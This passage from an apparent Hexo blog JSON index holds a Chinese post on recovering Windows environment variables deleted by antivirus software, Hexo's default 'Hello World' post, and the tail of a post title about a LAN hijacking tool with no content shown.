cadger工具一键劫持","categories":[{"name":"lan","slug":"lan","permalink":"http://Merl1ng.com/categories/lan/"}],"tags":[]},{"title":"环境变量和误删后的修复","slug":"环境变量和误删后的修复","date":"2017-04-30T15:10:52.000Z","updated":"2017-12-29T10:18:56.127Z","comments":true,"path":"2017/04/30/环境变量和误删后的修复/","link":"","permalink":"http://Merl1ng.com/2017/04/30/环境变量和误删后的修复/","excerpt":"在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径","text":"在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径 后面发现其实很多地方都需要配置环境变量 这可以让对工具的使用更加方便不用再到每个工具的文件上 或者逐一cd 使用命令行而是可以在任何地方直接输入命令调用 有次在增加环境变量是 点完确定 杀软提示给不给过 手贱点了 否 结果狗日的杀软把我的环境变量都给删了 orz.. 导致一进系统设置有关的地方全部弹窗 %windir% \\system32\\systempropertiescomputername.exe 先回去环境变量设置那里都不行 查了一下可以利用注册表增加环境变量 又试了试结果注册表也打不开 .. 当时差点重装了 好在最后找到了方法 win10在开机的欢迎页面摁住shift再点击重启 (可能要两回) 会看到提示页面 点击疑难解决 高级 重启 重启后 F4 进入安全模式 试了试cmd set 环境变量还是不行 无意间找到了 C:\\Windows\\System32 下的 SystemPropertiesAdvanced 文件 打开 成功添加 path 的数据可以在杀软的拦截日志里找回","categories":[{"name":"setting","slug":"setting","permalink":"http://Merl1ng.com/categories/setting/"}],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2017-04-12T15:50:25.000Z","updated":"2017-07-25T06:15:29.963Z","comments":true,"path":"2017/04/12/hello-world/","link":"","permalink":"http://Merl1ng.com/2017/04/12/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}